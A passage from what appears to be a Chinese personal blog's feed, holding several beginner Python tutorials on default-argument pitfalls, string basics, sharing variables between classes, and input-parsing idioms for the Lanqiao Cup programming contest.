<h3 id="场景-3：默认参数陷阱"><a href="#场景-3：默认参数陷阱" class="headerlink" title="场景 3：默认参数陷阱"></a>场景 3：默认参数陷阱</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 默认参数在定义时求值（仅一次）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buggy</span>(<span class="params">lst=[]</span>):</span><br><span class="line">    lst.append(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> lst</span><br><span class="line"></span><br><span class="line">buggy()  <span class="comment"># 返回 [1]</span></span><br><span class="line">buggy()  <span class="comment"># 返回 [1, 1] （非预期！）</span></span><br></pre></td></tr></table></figure></div>

<h2 id="5-最佳实践"><a href="#5-最佳实践" class="headerlink" title="5. 最佳实践"></a>5. 最佳实践</h2><ol>
<li>超过 3 个参数时建议使用关键字参数</li>
<li>避免可变对象作为默认参数</li>
<li>参数命名要有明确含义</li>
<li>复杂函数建议添加类型注解</li>
</ol>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">good_example</span>(<span class="params"></span></span><br><span class="line"><span class="params">    user_id: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    username: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    *,</span></span><br><span class="line"><span class="params">    is_admin: <span class="built_in">bool</span> = <span class="literal">False</span>,  <span class="comment"># 强制关键字参数</span></span></span><br><span class="line"><span class="params">    **options</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">dict</span>: ...</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><strong>关键记忆点</strong>：Python 参数传递只关心调用方式（位置&#x2F;关键字），与变量名无关。明确传递方式比依赖顺序更可靠。</p>
</blockquote>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python学习日记</title>
    <url>/posts/7c404c2f.html</url>
    <content><![CDATA[<blockquote>
<p>水个蓝桥算了</p>
</blockquote>
<h1 id="Python-算法学习记录"><a href="#Python-算法学习记录" class="headerlink" title="Python 算法学习记录"></a>Python 算法学习记录</h1><h2 id="变量和简单数据类型"><a href="#变量和简单数据类型" class="headerlink" title="变量和简单数据类型"></a>变量和简单数据类型</h2><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><h4 id="变量的命名和使用"><a href="#变量的命名和使用" class="headerlink" title="变量的命名和使用"></a>变量的命名和使用</h4><p>变量名只能包含字母、数字和下划线。变量名可以字母或下划线打头，但不能以数字打头，例如，可将变量命名为 message_1，但不能将其命名为 1_message</p>
<p>变量名不能包含空格，但可使用下划线来分隔其中的单词。例如，变量名 greeting_message 可行，但变量名 greeting message 会引发错误。</p>
<p>不要将 Python 关键字和函数名用作变量名，即不要使用 Python 保留用于特殊用途的单词，如 print（请参见附录 A.4）</p>
<p>变量名应既简短又具有描述性。例如，name 比 n 好，student_name 比 s_n 好，name_length 比 length_of_persons_name 好</p>
<p>慎用小写字母 l 和大写字母 O，因为它们可能被人错看成数字 1 和 0。</p>
<hr>
<p>注意 就目前而言，应使用小写的 Python 变量名。在变量名中使用大写字母虽然不会导致错误，但避免使用大写字母是个不错的主意</p>
<h4 id="使用变量时避免命名错误"><a href="#使用变量时避免命名错误" class="headerlink" title="使用变量时避免命名错误"></a>使用变量时避免命名错误</h4><ol>
<li>拼写错误</li>
<li>….其他错误</li>
</ol>
<h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>字符串就是一系列字符。在 Python 中，用引号括起的都是字符串，其中的引号可以是单引号，也可以是双引号</p>
<blockquote>
<p>“This is a string.”<br>‘This is also a string.’ </p>
</blockquote>
<p>这种灵活性让你能够在字符串中包含引号和撇号：</p>
<blockquote>
<p>‘I told my friend, “Python is my favorite language!”‘<br>“The language ‘Python’ is named after Monty Python, not the snake.”<br>“ One of Python’s strengths is its diverse and supportive community.</p>
</blockquote>
<p>下面是一些字符串的使用方式</p>
<h4 id="使用方法修改字符串的大小写"><a href="#使用方法修改字符串的大小写" class="headerlink" title="使用方法修改字符串的大小写"></a>使用方法修改字符串的大小写</h4><p>name.py </p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;ada lovelace&quot;</span> </span><br><span class="line"><span class="built_in">print</span>(name.title())</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>将这个文件保存为 name.py，再运行它。你将看到如下输出：<br>Ada Lovelace </p>
</blockquote>
<p><span style="color:#FF0000;"> title()是对句子进行首字母大写，其他字母小写的函数 </span>，适合处理姓名等的数据类型。</p>
<p>在 name.title()中，name 后面的句点（.）让 Python 对变量 name 执行方法 title()指定的操作。</p>
<p>每个方法后面都跟着一对括号，这是因为方法通常需要额外的信息来完成其工作。这种信息是在括号内提供的。函数 title()不需要额外的信息，因此它后面的括号是空的。</p>
<p>还有 upper()和 lower()分别是全大写和全小写的函数</p>
<p>测试代码</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;hELLo wOrld&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;原始字符串：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;首字母大写字符串：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(name.title())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;全大写字符串：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(name.upper())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;全小写字符串：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(name.lower())</span><br></pre></td></tr></table></figure></div>

<h4 id="合并（拼接）字符串"><a href="#合并（拼接）字符串" class="headerlink" title="合并（拼接）字符串"></a>合并（拼接）字符串</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">first_name = <span class="string">&quot;ada&quot;</span> </span><br><span class="line">last_name = <span class="string">&quot;lovelace&quot;</span> </span><br><span class="line">full_name = first_name + <span class="string">&quot; &quot;</span> + last_name</span><br><span class="line"><span class="built_in">print</span>(full_name)</span><br></pre></td></tr></table></figure></div>

<p>Python 使用加号（+）来合并字符串。在这个示例中，我们使用+来合并 first_name、空格和 last_name，以得到完整的姓名，其结果如下：</p>
<p>ada lovelace </p>
<p>这种合并字符串的方法称为拼接。通过拼接，可使用存储在变量中的信息来创建完整的消息</p>
<p>可以结合上一步的三个函数进行字符处理。</p>
<h4 id="使用制表符或换行符来添加空白"><a href="#使用制表符或换行符来添加空白" class="headerlink" title="使用制表符或换行符来添加空白"></a>使用制表符或换行符来添加空白</h4><p>在编程中，空白泛指 <strong>任何非打印字符，如空格、制表符和换行符</strong>。你可使用空白来组织输出，以使其更易读。</p>
<p>\t 缩进 \n 换行</p>
<h4 id="删除空白"><a href="#删除空白" class="headerlink" title="删除空白"></a>删除空白</h4><p>lstrip()删除开头的空白   rstrip()可以删除末尾的空白</p>
<h4 id="使用字符串时避免语法错误"><a href="#使用字符串时避免语法错误" class="headerlink" title="使用字符串时避免语法错误"></a>使用字符串时避免语法错误</h4><p>这边是注意引号，若字符串必须包括单引号，就用双引号引这个字符串</p>
<h3 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h3><h4 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h4><p>Python中整数可以直接进行加减乘除乘方的计算</p>
<p>Python还支持运算次序，因此你可在同一个表达式中使用多种运算。你还可以使用括号来修</p>
<hr>
<p>停更了</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python类之间的变量访问与操作</title>
    <url>/posts/f007d414.html</url>
    <content><![CDATA[
  <div class="note p-4 mb-4 rounded-small info">
    <p>本文含有 LLM 辅助，请谨慎参考。</p>

  </div>

<h1 id="Python-类之间的变量访问与操作详解"><a href="#Python-类之间的变量访问与操作详解" class="headerlink" title="Python 类之间的变量访问与操作详解"></a>Python 类之间的变量访问与操作详解</h1><p>在面向对象编程中，类是组织代码的重要方式，但很多初学者对于类之间如何共享和访问变量感到困惑。本文将详细解析 Python 类的变量访问机制，以及不同类之间如何实现数据共享与操作。</p>
<h2 id="类函数与普通函数的区别"><a href="#类函数与普通函数的区别" class="headerlink" title="类函数与普通函数的区别"></a>类函数与普通函数的区别</h2><h3 id="类函数的基本概念"><a href="#类函数的基本概念" class="headerlink" title="类函数的基本概念"></a>类函数的基本概念</h3><p>类函数（也称为方法）与普通函数有着本质的区别，主要体现在数据的存储和访问方式上。</p>
<h3 id="类函数（方法）的特点"><a href="#类函数（方法）的特点" class="headerlink" title="类函数（方法）的特点"></a>类函数（方法）的特点</h3><ul>
<li>有”记忆”能力：实例变量会一直保存在内存中</li>
<li>共享数据：同一个实例的所有方法可以访问相同的实例变量</li>
<li>不必重复传参：只需要通过 self 就能访问实例的所有属性</li>
</ul>
<h3 id="普通函数的特点"><a href="#普通函数的特点" class="headerlink" title="普通函数的特点"></a>普通函数的特点</h3><ul>
<li>无状态：函数执行完毕后变量就会被销毁</li>
<li>需要显式传参：每次调用都需要提供所有必要的参数</li>
<li>数据隔离：不同函数间的数据需要通过参数和返回值传递</li>
</ul>
<h3 id="形象比喻"><a href="#形象比喻" class="headerlink" title="形象比喻"></a>形象比喻</h3><p>**类实例就像一个”工具箱”**：</p>
<ul>
<li>工具箱里放着各种工具（实例属性）</li>
<li>工具箱有不同的使用方法（实例方法）</li>
<li>所有的方法都可以拿到工具箱里的任何工具</li>
</ul>
<p>**普通函数像是”独立工人”**：</p>
<ul>
<li>每次工作都需要给他所有必要的工具</li>
<li>工作完成后会把工具还回去</li>
<li>下次再做同样的工作还需要重新给他工具</li>
</ul>
<h2 id="代码对比"><a href="#代码对比" class="headerlink" title="代码对比"></a>代码对比</h2><h3 id="使用类的方式："><a href="#使用类的方式：" class="headerlink" title="使用类的方式："></a>使用类的方式：</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TextAnalyzer</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, word_manager</span>):</span><br><span class="line">        <span class="comment"># 存储word_manager作为实例属性</span></span><br><span class="line">        <span class="variable language_">self</span>.word_manager = word_manager</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">analyze_text</span>(<span class="params">self, text, group_id, threshold</span>):</span><br><span class="line">        <span class="comment"># 可以直接使用self.word_manager，不需要再传递</span></span><br><span class="line">        words_dict = <span class="variable language_">self</span>.word_manager.get_merged_words(group_id)</span><br><span class="line">        <span class="comment"># ...分析文本</span></span><br><span class="line">        <span class="keyword">return</span> total_score, risk_level, triggered_words</span><br></pre></td></tr></table></figure></div>

<h3 id="如果使用普通函数："><a href="#如果使用普通函数：" class="headerlink" title="如果使用普通函数："></a>如果使用普通函数：</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">analyze_text</span>(<span class="params">word_manager, text, group_id, threshold</span>):</span><br><span class="line">    <span class="comment"># 每次调用都需要传入word_manager</span></span><br><span class="line">    words_dict = word_manager.get_merged_words(group_id)</span><br><span class="line">    <span class="comment"># ...分析文本</span></span><br><span class="line">    <span class="keyword">return</span> total_score, risk_level, triggered_words</span><br></pre></td></tr></table></figure></div>

<h2 id="self-的访问范围"><a href="#self-的访问范围" class="headerlink" title="self 的访问范围"></a>self 的访问范围</h2><p>很多人误解 self 可以访问任何类的变量，实际上 self 只能访问”自己的”变量。</p>
<h3 id="正确理解"><a href="#正确理解" class="headerlink" title="正确理解"></a>正确理解</h3><ul>
<li>每个类实例只能通过 self 访问自己的属性</li>
<li>self.属性名 只能访问当前实例的属性</li>
<li>不同类之间不共享变量空间</li>
<li>类之间的数据共享需要显式建立联系<ul>
<li>将一个类的实例作为另一个类的属性</li>
<li>通过参数传递实例</li>
</ul>
</li>
</ul>
<h3 id="实际例子"><a href="#实际例子" class="headerlink" title="实际例子"></a>实际例子</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># WordManager类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WordManager</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data_dir</span>):</span><br><span class="line">        <span class="variable language_">self</span>.data_dir = data_dir</span><br><span class="line">        <span class="variable language_">self</span>.global_words = &#123;&#125; <span class="comment"># 只属于WordManager实例的属性</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_merged_words</span>(<span class="params">self, group_id</span>):</span><br><span class="line">        <span class="comment"># 只能访问自己的属性</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.global_words.copy()</span><br><span class="line"></span><br><span class="line"><span class="comment"># TextAnalyzer类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TextAnalyzer</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, word_manager</span>):</span><br><span class="line">        <span class="comment"># 保存WordManager实例作为自己的属性</span></span><br><span class="line">        <span class="variable language_">self</span>.word_manager = word_manager <span class="comment"># 建立关联</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">analyze_text</span>(<span class="params">self, text, group_id, threshold</span>):</span><br><span class="line">        <span class="comment"># 可以访问word_manager的方法和属性</span></span><br><span class="line">        words_dict = <span class="variable language_">self</span>.word_manager.get_merged_words(group_id)</span><br><span class="line">        <span class="comment"># ...但不能直接访问WordManager内部的属性</span></span><br><span class="line">        <span class="comment"># 例如：self.global_words 是不可访问的</span></span><br></pre></td></tr></table></figure></div>

<h2 id="如何从一个类访问另一个类的变量"><a href="#如何从一个类访问另一个类的变量" class="headerlink" title="如何从一个类访问另一个类的变量"></a>如何从一个类访问另一个类的变量</h2><p>下面介绍几种在不同类之间共享和操作变量的方法：</p>
<h3 id="1-依赖注入（推荐方法）"><a href="#1-依赖注入（推荐方法）" class="headerlink" title="1. 依赖注入（推荐方法）"></a>1. 依赖注入（推荐方法）</h3><p>这是最常用、最灵活的方法，通过构造函数传递依赖关系。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义两个类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">数据类</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.内部数据 = <span class="string">&quot;重要数据&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">获取数据</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.内部数据</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">设置数据</span>(<span class="params">self, 新数据</span>):</span><br><span class="line">        <span class="variable language_">self</span>.内部数据 = 新数据</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">操作类</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, 数据实例</span>):</span><br><span class="line">        <span class="comment"># 保存另一个类的实例作为属性</span></span><br><span class="line">        <span class="variable language_">self</span>.数据 = 数据实例</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">处理</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 1. 读取另一个类的数据</span></span><br><span class="line">        当前数据 = <span class="variable language_">self</span>.数据.获取数据()</span><br><span class="line">        <span class="comment"># 2. 修改另一个类的数据</span></span><br><span class="line">        处理后数据 = 当前数据 + <span class="string">&quot;已处理&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.数据.设置数据(处理后数据)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用方式</span></span><br><span class="line">数据实例 = 数据类()</span><br><span class="line">操作实例 = 操作类(数据实例) <span class="comment"># 注入依赖</span></span><br><span class="line">操作实例.处理() <span class="comment"># 处理数据</span></span><br></pre></td></tr></table></figure></div>

<p><strong>优点</strong>：</p>
<ul>
<li>代码解耦，易于测试</li>
<li>依赖关系明确</li>
<li>灵活性高</li>
</ul>
<h3 id="2-通过访问器方法"><a href="#2-通过访问器方法" class="headerlink" title="2. 通过访问器方法"></a>2. 通过访问器方法</h3><p>通过公共方法访问和修改另一个类的数据。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A类</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.私有数据 = <span class="number">100</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提供访问方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">获取数据</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.私有数据</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">设置数据</span>(<span class="params">self, 值</span>):</span><br><span class="line">        <span class="variable language_">self</span>.私有数据 = 值</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B类</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a实例</span>):</span><br><span class="line">        <span class="variable language_">self</span>.a = a实例</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">操作</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 通过方法访问和修改</span></span><br><span class="line">        当前值 = <span class="variable language_">self</span>.a.获取数据()</span><br><span class="line">        <span class="variable language_">self</span>.a.设置数据(当前值 + <span class="number">50</span>)</span><br></pre></td></tr></table></figure></div>

<p><strong>优点</strong>：</p>
<ul>
<li>保持封装性</li>
<li>可以添加验证逻辑</li>
<li>接口稳定</li>
</ul>
<h3 id="3-通过返回值传递"><a href="#3-通过返回值传递" class="headerlink" title="3. 通过返回值传递"></a>3. 通过返回值传递</h3><p>通过方法返回值在类之间传递数据。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">生成器</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.内部计数 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">生成数据</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.内部计数 += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;数据-<span class="subst">&#123;self.内部计数&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">处理器</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">处理数据</span>(<span class="params">self, 生成器实例</span>):</span><br><span class="line">        <span class="comment"># 获取数据并处理</span></span><br><span class="line">        数据 = 生成器实例.生成数据()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;处理结果: <span class="subst">&#123;数据&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>优点</strong>：</p>
<ul>
<li>简单直接</li>
<li>无需保存引用</li>
<li>适合一次性操作</li>
</ul>
<h3 id="4-使用全局实例（不太推荐）"><a href="#4-使用全局实例（不太推荐）" class="headerlink" title="4. 使用全局实例（不太推荐）"></a>4. 使用全局实例（不太推荐）</h3><p>通过全局变量共享实例。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 全局实例</span></span><br><span class="line">全局数据管理器 = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">数据管理器</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.共享数据 = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">设置</span>(<span class="params">self, 键, 值</span>):</span><br><span class="line">        <span class="variable language_">self</span>.共享数据[键] = 值</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">获取</span>(<span class="params">self, 键</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.共享数据.get(键)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">使用者</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">操作</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">global</span> 全局数据管理器</span><br><span class="line">        <span class="comment"># 使用全局实例</span></span><br><span class="line">        全局数据管理器.设置(<span class="string">&quot;计数&quot;</span>, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">初始化系统</span>():</span><br><span class="line">    <span class="keyword">global</span> 全局数据管理器</span><br><span class="line">    全局数据管理器 = 数据管理器()</span><br></pre></td></tr></table></figure></div>

<p><strong>缺点</strong>：</p>
<ul>
<li>全局状态难以测试</li>
<li>依赖关系不明确</li>
<li>可能导致意外修改</li>
</ul>
<h3 id="5-通过继承关系（适用于特定场景）"><a href="#5-通过继承关系（适用于特定场景）" class="headerlink" title="5. 通过继承关系（适用于特定场景）"></a>5. 通过继承关系（适用于特定场景）</h3><p>通过继承共享基类的属性和方法。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">基础类</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.共享数据 = <span class="string">&quot;基础数据&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">基础方法</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.共享数据</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">扩展类</span>(<span class="title class_ inherited__">基础类</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__() <span class="comment"># 调用父类初始化</span></span><br><span class="line">        <span class="variable language_">self</span>.扩展数据 = <span class="string">&quot;扩展数据&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">扩展方法</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 可以直接访问继承的属性</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.共享数据&#125;</span> + <span class="subst">&#123;self.扩展数据&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>适用场景</strong>：</p>
<ul>
<li>真正的”是一个”关系</li>
<li>需要复用大量代码</li>
<li>有明确的层次结构</li>
</ul>
<h2 id="最佳实践总结"><a href="#最佳实践总结" class="headerlink" title="最佳实践总结"></a>最佳实践总结</h2><ul>
<li>首选依赖注入：灵活、解耦、易测试</li>
<li>使用公共接口：而不是直接访问属性</li>
<li>避免使用全局变量：会导致代码难以测试和维护</li>
<li>继承用于”是一个”关系：不要仅为共享数据而继承</li>
<li>保持封装性：通过方法而非直接访问属性</li>
</ul>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>理解类之间的变量访问和操作是掌握面向对象编程的关键。通过选择合适的方式在类之间共享数据，可以使代码更加模块化、可维护和可测试。依赖注入作为最推荐的方式，不仅提供了灵活性，还保持了良好的代码结构和测试性。</p>
<p>希望本文能帮助你更好地理解 Python 类之间的变量访问机制，编写出更优雅的面向对象代码。</p>
]]></content>
      <categories>
        <category>编程技术</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>面向对象编程</tag>
        <tag>类</tag>
        <tag>变量访问</tag>
      </tags>
  </entry>
  <entry>
    <title>Python蓝桥杯常用函数以及问题</title>
    <url>/posts/7bb4fcd.html</url>
    <content><![CDATA[<blockquote>
<p>摘自 <a class="link"   href="https://blog.csdn.net/m0_46204224/article/details/109049999#/" >https://blog.csdn.net/m0_46204224/article/details/109049999#/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<h2 id="Python-常用函数"><a href="#Python-常用函数" class="headerlink" title="Python 常用函数"></a>Python 常用函数</h2><h3 id="input-函数"><a href="#input-函数" class="headerlink" title="input 函数"></a>input 函数</h3><h4 id="单行输入"><a href="#单行输入" class="headerlink" title="单行输入"></a>单行输入</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">input</span>().split()))</span><br><span class="line"><span class="comment">#输入不定量的以空格分隔的连续输入</span></span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">m,n = <span class="built_in">map</span>(<span class="built_in">int</span>,intput().split())</span><br><span class="line"><span class="comment">#输入定量的以空格分隔的连续输入</span></span><br></pre></td></tr></table></figure></div>

<p>注意：若间隔号不是空格，而是其他符号，只需要在 split(“”)中定义间隔号即可，例如</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">input</span>().split(<span class="string">&quot;-&quot;</span>)))</span><br><span class="line">m,n = <span class="built_in">map</span>(<span class="built_in">int</span>,intput().split(<span class="string">&quot;-&quot;</span>))</span><br><span class="line"><span class="comment">#用-分割</span></span><br></pre></td></tr></table></figure></div>

<h4 id="多行输入"><a href="#多行输入" class="headerlink" title="多行输入"></a>多行输入</h4><p>一个 input 输入一个数字，列表，每次每行只能输入一个数字</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">data1 = [<span class="built_in">int</span>(<span class="built_in">input</span>()) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line"><span class="comment"># 一个 input 输入一个数字，列表，每次每行只能输入一个数字</span></span><br><span class="line"><span class="built_in">print</span>(data1)</span><br><span class="line"><span class="comment"># [1,2]</span></span><br></pre></td></tr></table></figure></div>

<p>一个 input 输入一串数字，列表的列表</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">data2 = [<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line"><span class="comment"># 一个 input 输入一串数字，列表的列表</span></span><br><span class="line"><span class="built_in">print</span>(data2)</span><br><span class="line"><span class="comment"># [[1], [15]]</span></span><br></pre></td></tr></table></figure></div>

<p>有选择的保存数据</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">list3 = []</span><br><span class="line">list4 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    m, n = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">    <span class="keyword">if</span> m &gt; <span class="number">0</span>:</span><br><span class="line">        list3.append(m)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        list4.append(n)</span><br><span class="line"><span class="built_in">print</span>(list3)</span><br><span class="line"><span class="built_in">print</span>(list4)</span><br><span class="line"><span class="comment"># 有选择的保存数据</span></span><br><span class="line"><span class="comment"># 这段代码的作用是从用户输入中获取两组数字对，并根据每对数字的第一个数字是正数还是非正数（包括负数和零），将其分别存储到两个不同的列表中。最后，打印出这两个列表中的内容。</span></span><br></pre></td></tr></table></figure></div>

<h4 id="各种输入"><a href="#各种输入" class="headerlink" title="各种输入"></a>各种输入</h4><ul>
<li><code>input()</code> 返回的是字符串类型 <code>(str)</code></li>
<li>一次输入多个值就用 <code>list(input().split())</code></li>
<li>根据需求加 <code>map</code>，即 <code>map(int,input.split())</code></li>
<li>每出现一个 <code>input()</code> 就代表了一行，加了 <code>map</code> 就代表是变量多接受输入</li>
</ul>
<p>例如：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">input</span>()  <span class="comment"># 接受一个值</span></span><br><span class="line">a, b = <span class="built_in">input</span>().split()  <span class="comment"># 接受两个值，空格输入，回车执行</span></span><br><span class="line">c = <span class="built_in">input</span>().split()  <span class="comment"># 输入为列表</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>举例合集</li>
</ul>
